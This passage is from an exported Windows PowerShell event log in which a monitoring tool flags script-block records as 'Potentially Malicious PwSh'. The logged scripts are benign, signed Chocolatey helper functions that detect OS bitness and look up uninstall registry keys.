BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU2WjAjBgkqhkiG9w0BCQQxFgQUQekAipyHZj/2ib13 # V41/KGW2HqcwDQYJKoZIhvcNAQEBBQAEggEAhdsnEFLCzzvdikeGGRpCELtJtKGY # dVO1NWtm4UqWDlCg6n+aWm0/81MWDOkyzeXzYuWeBK5dU2dvLrV3vtlKJvEDJ3p3 # caImQHht9OvP7kMWRJ9YuH5j+Hh2StWpsOxKWEQjUawkin2pJSOE7oFNte8rA0zB # fL9uclSP1n20elP+4Uf3NQASJdjcLypcwkOOk0D+mWjFI0eFTxc5WY6/u4u8hLZu # XS0q7rRIBi8wQgTtZQ63WQwkgl00kUpy1SdFehmRfbq2onSw8LbJQh6ZI/Gt477b # FWOp8lN75cQHTfqF31fPr/PDP0LPeVn0XKEsemZZEqhbWTQE/Pg4S+QHeA== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateyInstall\helpers\functions\Get-OSArchitectureWidth.ps1 ¦ ScriptBlockId: 38a7f819-4c25-4c4b-8e8f-80525763f684 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-OSArchitectureWidth { <# .SYNOPSIS Get the operating system architecture address width. .DESCRIPTION This will return the system architecture address width (probably 32 or 64 bit). If you pass a comparison, it will return true or false instead of {`32`|`64`}. .NOTES When your installation script has to know what architecture it is run on, this simple function comes in handy. Available as `Get-OSArchitectureWidth` in 0.9.10+. If you need compatibility with pre 0.9.10, please use the alias `Get-ProcessorBits`. .INPUTS None .OUTPUTS None .PARAMETER Compare This optional parameter causes the function to return $true or $false, depending on wether or not the bit width matches. #> param( $compare ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bits = 64 if (([System.IntPtr]::Size -eq 4) -and (Test-Path env:\PROCESSOR_ARCHITEW6432)) { $bits = 64 } elseif ([System.IntPtr]::Size -eq 4) { $bits = 32 } # Return bool|int if (""$compare"" -ne '' -and $compare -eq $bits) { return $true } elseif (""$compare"" -ne '') { return $false } else { return $bits } } Set-Alias Get-ProcessorBits Get-OSArchitectureWidth Set-Alias Get-OSBitness Get-OSArchitectureWidth # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCC+5R24zufGXnsc # mWj/25mf6jwe97cvRY7+8fCOG4I2J6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgP758QKNsTW8rWPEwFItvwYU40LERXrsVnMIx # EW0I+YIwDQYJKoZIhvcNAQEBBQAEggEAnYGeuRcmWugYjQnOQJRgsG/fTDMry1sv # PxtTaoIGjlW8iPLJk58sQdyQxEfkcsNe58bwKnvB8B0kvMol/AES2Esz4QYX/A7Z # iXdB1XxsQVio7B8XsQdGmePNEeIda18ExPkIyDnKD2grpDiFz8vaQp8CsZZcfZzc # fbM5qcUF5HFCdTI4gFxb3NXduCk7mOIhDajJH4cVpdz0N1FfVuTR+sDErHUS72vd # BQtW/gOPSA0JIetcmJrqvRXdx3n0Sp32kBxn7XyypO1L3PxBgZwW94ekQDIe5v3F # SKlmv2E38T0tU5/IUX2PNV3vMKWHs3E7Me6r6+h1TcHeXhTrRrV586GCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU2WjAjBgkqhkiG9w0BCQQxFgQUQekAipyHZj/2ib13 # V41/KGW2HqcwDQYJKoZIhvcNAQEBBQAEggEAhdsnEFLCzzvdikeGGRpCELtJtKGY # dVO1NWtm4UqWDlCg6n+aWm0/81MWDOkyzeXzYuWeBK5dU2dvLrV3vtlKJvEDJ3p3 # caImQHht9OvP7kMWRJ9YuH5j+Hh2StWpsOxKWEQjUawkin2pJSOE7oFNte8rA0zB # fL9uclSP1n20elP+4Uf3NQASJdjcLypcwkOOk0D+mWjFI0eFTxc5WY6/u4u8hLZu # XS0q7rRIBi8wQgTtZQ63WQwkgl00kUpy1SdFehmRfbq2onSw8LbJQh6ZI/Gt477b # FWOp8lN75cQHTfqF31fPr/PDP0LPeVn0XKEsemZZEqhbWTQE/Pg4S+QHeA== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:32.088 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,61,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2011 - 2017 RealDimensions Software, LLC # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-UninstallRegistryKey { <# .SYNOPSIS Retrieve registry key(s) for system-installed applications from an exact or wildcard search. .DESCRIPTION This function will attempt to retrieve a matching registry key for an already installed application, usually to be used with a chocolateyUninstall.ps1 automation script. The function also prevents `Get-ItemProperty` from failing when handling wrongly encoded registry keys. .NOTES Available in 0.9.10+. If you need to maintain compatibility with pre 0.9.10, please add the following to your nuspec (check for minimum version): ~~~xml <dependencies> <dependency id=""chocolatey-core.extension"" version=""1.1.0"" /> </dependencies> ~~~ .INPUTS String .OUTPUTS This function searches registry objects and returns an array of PSCustomObject with the matched key's properties. Retrieve properties with dot notation, for example: `$key.UninstallString` .PARAMETER SoftwareName Part or all of the Display Name as you see it in Programs and Features. It should be enough to be unique. The syntax follows the rules of the PowerShell `-like` operator, so the `*` character is interpreted as a wildcard, which matches any (zero or more) characters. If the display name contains a version number, such as ""Launchy (2.5)"", it is recommended you use a fuzzy search `""Launchy (*)""` (the wildcard `*`) so if Launchy auto-updates or is updated outside of Chocolatey, the uninstall script will not fail. Take care not to abuse fuzzy/glob pattern searches. Be conscious of programs that may have shared or common root words to prevent overmatching. For example, ""SketchUp*"" would match two keys with software names ""SketchUp 2016"" and ""SketchUp Viewer"" that are different programs released by the same company. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Version match: Software name is ""Gpg4Win (2.3.0)"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""Gpg4win (*)"" $key.UninstallString .EXAMPLE > # Fuzzy match: Software name is ""Launchy 2.5"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""Launchy*"" $key.UninstallString .EXAMPLE > # Exact match: Software name in Programs and Features is ""VLC media player"" [array]$key = Get-UninstallRegistryKey -SoftwareName ""VLC media player"" $key.UninstallString .EXAMPLE > # Version match: Software name is ""SketchUp 2016"" # Note that the similar software name ""SketchUp Viewer"" would not be matched. [array]$key = Get-UninstallRegistryKey -SoftwareName ""SketchUp [0-9]*"" $key.UninstallString .LINK Install-ChocolateyPackage .LINK Install-ChocolateyInstallPackage .LINK Uninstall-ChocolateyPackage #> [CmdletBinding()] param( [parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)] [string] $softwareName, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($softwareName -eq $null -or $softwareName -eq '') { throw ""$SoftwareName cannot be empty for Get-UninstallRegistryKey"" } $ErrorActionPreference = 'Stop' $local_key = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' $machine_key = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' $machine_key6432 = 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' Write-Verbose ""Retrieving all uninstall registry keys"" [array]$keys = Get-ChildItem -Path @($machine_key6432, $machine_key, $local_key) -ErrorAction SilentlyContinue Write-Debug ""Registry uninstall keys on system: $($keys.Count)"" Write-Debug ""Error handling check: `'Get-ItemProperty`' fails if a registry key is encoded incorrectly."" [int]$maxAttempts = $keys.Count for ([int]$attempt = 1; $attempt -le $maxAttempts; $attempt++) { [bool]$success = $false $keyPaths = $keys | Select-Object -ExpandProperty PSPath try { [array]$foundKey = Get-ItemProperty -Path $keyPaths -ErrorAction Stop | ? { $_.DisplayName -like $softwareName } $success = $true } catch { Write-Debug ""Found bad key."" foreach ($key in $keys){ try { Get-ItemProperty $key.PsPath > $null } catch { $badKey = $key.PsPath } } Write-Verbose ""Skipping bad key: $badKey"" [array]$keys = $keys | ? { $badKey -NotContains $_.PsPath } } if ($success) { break; } if ($attempt -ge 10) { Write-Warning ""Found 10 or more bad registry keys. Run command again with `'--verbose --debug`' for more info."" Write-Debug ""Each key searched should correspond to an installed program. It is very unlikely to have more than a few programs with incorrectly encoded keys, if any at all. This may be indicative of one or more corrupted registry branches."" } } if ($foundKey -eq $null -or $foundkey.Count -eq 0) { Write-Warning ""No registry key found based on '$softwareName'"" } Write-Debug ""Found $($foundKey.Count) uninstall registry key(s) with SoftwareName:`'$SoftwareName`'""; return $foundKey } Set-Alias Get-InstallRegistryKey Get-UninstallRegistryKey # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBES8sHzbRLLNcJ # 9iSdROLrD1zFWyfa5gBGwaNn1wzd16CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # 